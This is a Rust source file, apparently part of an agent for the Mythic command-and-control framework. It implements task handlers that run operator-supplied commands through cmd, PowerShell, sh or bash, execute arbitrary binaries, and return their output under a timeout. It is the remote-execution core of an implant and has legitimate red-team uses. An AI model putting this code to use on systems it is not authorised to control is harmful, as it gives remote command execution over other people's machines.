//! Process execution helpers for shell-specific commands and direct exec.

use std::io::Read;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::time::Duration;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;
use uuid::Uuid;

use crate::sys::encoding::decode_output;

const DEFAULT_TIMEOUT_SECS: u64 = 60;

#[derive(Clone, Copy)]
pub enum ShellKind {
    Cmd,
    PowerShell,
    Sh,
    Bash,
}

#[derive(Deserialize)]
struct ShellParams {
    command: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
}

#[derive(Deserialize)]
struct ExecParams {
    path: String,
    #[serde(default)]
    args: Vec<String>,
    #[serde(default)]
    arguments: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
}

const fn default_timeout() -> u64 {
    DEFAULT_TIMEOUT_SECS
}

fn split_args(input: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;

    for ch in input.chars() {
        match quote {
            Some(q) if ch == q => quote = None,
            Some(_) => cur.push(ch),
            None if ch == '"' || ch == '\'' => quote = Some(ch),
            None if ch.is_whitespace() => {
                if !cur.is_empty() {
                    args.push(std::mem::take(&mut cur));
                }
            }
            None => cur.push(ch),
        }
    }
    if !cur.is_empty() {
        args.push(cur);
    }
    args
}

fn shell_spec(kind: ShellKind) -> Result<(&'static str, &'static str), String> {
    match kind {
        ShellKind::Cmd => {
            if cfg!(windows) {
                Ok(("cmd", "/c"))
            } else {
                Err("cmd is only supported on Windows".into())
            }
        }
        ShellKind::PowerShell => {
            if cfg!(windows) {
                Ok(("powershell", "-Command"))
            } else {
                Err("powershell is only supported on Windows".into())
            }
        }
        ShellKind::Sh => {
            if cfg!(windows) {
                Err("sh is only supported on Unix-like targets".into())
            } else {
                Ok(("sh", "-c"))
            }
        }
        ShellKind::Bash => {
            if cfg!(windows) {
                Err("bash is only supported on Unix-like targets".into())
            } else {
                Ok(("bash", "-c"))
            }
        }
    }
}

pub fn handle_shell(task: &TaskMessage, kind: ShellKind) -> TaskResponse {
    let params = match serde_json::from_str::<ShellParams>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("shell parse error: {e}")),
    };
    if params.command.trim().is_empty() {
        return TaskResponse::failed(task.id, "command is required");
    }

    let (bin, flag) = match shell_spec(kind) {
        Ok(spec) => spec,
        Err(e) => return TaskResponse::failed(task.id, &e),
    };
    run_child(
        task.id,
        bin,
        vec![flag.into(), params.command.clone()],
        params.timeout,
        bin,
        &params.command,
    )
}

pub fn handle_execute(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<ExecParams>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("execute parse error: {e}")),
    };
    let path = params.path.trim();
    if path.is_empty() {
        return TaskResponse::failed(task.id, "execute requires a path");
    }

    let args = if params.args.is_empty() && !params.arguments.trim().is_empty() {
        split_args(&params.arguments)
    } else {
        params.args
    };
    let display = if args.is_empty() {
        path.to_string()
    } else {
        format!("{} {}", path, args.join(" "))
    };
    run_child(task.id, path, args, params.timeout, path, &display)
}

fn run_child(
    task_id: Uuid,
    bin: &str,
    args: Vec<String>,
    timeout_secs: u64,
    label: &str,
    display_command: &str,
) -> TaskResponse {
    let mut child = match Command::new(bin)
        .args(&args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return TaskResponse::failed(task_id, &format!("{label} failed: {e}")),
    };

    let child_id = child.id();
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let Some(mut stdout) = child.stdout.take() else {
        return TaskResponse::failed(task_id, &format!("{label} stdout pipe unavailable"));
    };
    let Some(mut stderr) = child.stderr.take() else {
        return TaskResponse::failed(task_id, &format!("{label} stderr pipe unavailable"));
    };

    let (tx, rx) = mpsc::channel();
    std::thread::spawn(move || {
        let mut out_buf = Vec::new();
        let mut err_buf = Vec::new();
        let _ = stdout.read_to_end(&mut out_buf);
        let _ = stderr.read_to_end(&mut err_buf);
        let status = child.wait().ok();
        let _ = tx.send((status, out_buf, err_buf));
    });

    match rx.recv_timeout(timeout) {
        Ok((status, out_buf, err_buf)) => {
            let stdout_str = decode_output(&out_buf);
            let stderr_str = decode_output(&err_buf);
            let output = if stderr_str.is_empty() {
                stdout_str
            } else {
                format!("{stdout_str}\n{stderr_str}")
            };
            let code = status.and_then(|s| s.code()).unwrap_or(-1);
            let result_msg = if code == 0 {
                output
            } else {
                format!("{output}\n[exit code: {code}]")
            };
            TaskResponse {
                task_id,
                completed: Some(true),
                status: Some("completed".into()),
                user_output: Some(result_msg),
                ..Default::default()
            }
        }
        Err(mpsc::RecvTimeoutError::Timeout) => {
            #[cfg(unix)]
            {
                let _ = Command::new("kill")
                    .args(["-9", &child_id.to_string()])
                    .output();
            }
            #[cfg(windows)]
            {
                let _ = Command::new("taskkill")
                    .args(["/F", "/PID", &child_id.to_string()])
                    .output();
            }
            let _ = rx.recv_timeout(Duration::from_secs(2));
            TaskResponse::failed(
                task_id,
                &format!("{label} timed out after {timeout_secs}s (command: {display_command})"),
            )
        }
        Err(mpsc::RecvTimeoutError::Disconnected) => {
            TaskResponse::failed(task_id, &format!("{label} process terminated unexpectedly"))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_split_args_preserves_backslashes_and_quotes() {
        assert_eq!(
            split_args(r#"--path C:\Temp\a.txt "C:\Program Files\x.txt""#),
            vec!["--path", r"C:\Temp\a.txt", r"C:\Program Files\x.txt"]
        );
    }

    #[test]
    fn test_cmd_rejected_on_non_windows() {
        #[cfg(not(windows))]
        {
            let task = TaskMessage {
                command: "cmd".into(),
                parameters: r#"{"command":"echo hi"}"#.into(),
                ..Default::default()
            };
            let resp = handle_shell(&task, ShellKind::Cmd);
            assert_eq!(resp.status.as_deref(), Some("error"));
        }
    }
}
